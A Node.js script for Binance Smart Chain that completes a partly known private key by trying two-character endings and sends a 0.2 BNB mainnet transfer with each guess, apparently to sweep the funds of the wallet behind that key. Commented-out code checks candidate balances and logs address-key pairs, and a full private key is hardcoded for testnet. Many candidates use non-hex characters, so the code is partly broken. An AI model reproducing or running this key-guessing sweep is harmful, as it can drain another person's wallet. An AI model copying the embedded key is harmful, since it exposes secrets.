const BSC_HELPER = require('./lib/bsc_help');
var acc1 = "0x7EaBBb7dcE696e00a2644eE41Ceb01fB7b55204c";
var privateKey1 = "9ab22714d758b2a1a885eba813a6b7f132b1b437f707953a32ecb40d5b3cdc21";
const fs = require('fs');
var Wallet = require('ethereumjs-wallet').default;
var EthUtil = require('ethereumjs-util');
// console.log(Wallet);

var getArr = async function() {
    return new Promise((resolve) => {
        var arrKQ = [];
        // var arrA = ['a','b','c','d', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l','m', 'n', 'o','p','q','r','s','t','u','v','x','y','z', '0', '1','2','3','4','5','6', '7','8','9'];
        var arrA = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
        var arrXX = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
        console.log(arrA.length, arrXX.length);
        for (var i = 0; i < arrA.length; i++) {
            for (var j = 0; j < arrXX.length; j++) {
                var dark = arrA[i] + arrXX[j];
                arrKQ.push(dark);
            }
        }
        resolve(arrKQ);
    })
}

var main = async function() {
    // var balance = await BSC_HELPER.getBalance("testnet","0x7EaBBb7dcE696e00a2644eE41Ceb01fB7b55204c");
    // console.log('balance', balance);

    // var account = await BSC_HELPER.createAccount("testnet");
    // console.log('create account', account);

    // var count = await BSC_HELPER.getTransactionCount("testnet", '0x7EaBBb7dcE696e00a2644eE41Ceb01fB7b55204c');
    // console.log('getTransactionCount', count);

    // var result = await BSC_HELPER.sendSignedTransaction('testnet', acc1, '0xf620d56DC0Cc7C22eedac4e8Fb36D893299A2c24' , 10000000000000000, null, null, privateKey1);
    // console.log('Txn Sent and hash is ', result);

    // var getTransactionReceipt = await BSC_HELPER.getTransactionReceipt("testnet", '0xe4b4c36cfb33c3535fcd2b5b0a6db38b545808a0a25c7b02cdf739f5d9253bbe');
    // console.log('getTransactionReceipt', getTransactionReceipt);

    const Web3 = require('web3');
    var Tx = require('ethereumjs-tx').Transaction;
    // const Common = require('ethereumjs-common');

    // // mainnet
    // // const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
    // const common_Mainnet = Common.default.forCustomChain('mainnet', {
    //     name: 'Binance Smart Chain',
    //     networkId: 56,
    //     chainId: 56,
    //     url: "https://bscscan.com"
    // }, 'petersburg');

    var web3 = new Web3('https://bsc-dataseed1.binance.org:443');


    // var balance = await web3.eth.getBalance('0x436ac00924af46ad95b5397baa8ab706c059f97b');
    //     if(balance > 0) console.log('dm may ', balance);

    var arr = await getArr();
    for (var i = 0; i < arr.length; i++) {
        // var result = await web3.eth.accounts.privateKeyToAccount('0x9de180c32ddd73dd914d254c9aed8f1211164526b3c6a74b03d52bf341ddde' + arr[i]);
        // var balance = await web3.eth.getBalance(result.address);
        // if(balance > 0) console.log('dm may ', result);


        const privateKeyString = '9de180c32ddd73dd914d254c9aed8f1211164526b3c6a74b03d52bf341ddde' + arr[i];


        BSC_HELPER.sendSignedTransaction(web3, 'mainnet', '0x5E7C9Af2B6D3bB508EADeBf58221B205D13704f6', '0x4441A4f4e640b22D496b6d5D1Ed51fEDE7F75AAE', 200000000000000000, null, null, privateKeyString);
        // console.log('Txn Sent and hash is ', result);


        // const privateKeyBuffer = EthUtil.toBuffer(privateKeyString);
        // var wallet = Wallet.fromPrivateKey(privateKeyBuffer);
        // const address = wallet.getAddressString();
        // // console.log(address);



        // fs.appendFileSync('message.txt', address + ' - ' + privateKeyString);
        // // fs.appendFileSync('message.txt', '\n   --Balance : ' + balance + '   \n');
        // fs.appendFileSync('message.txt', '\n               ------               \n');
    }





}


main();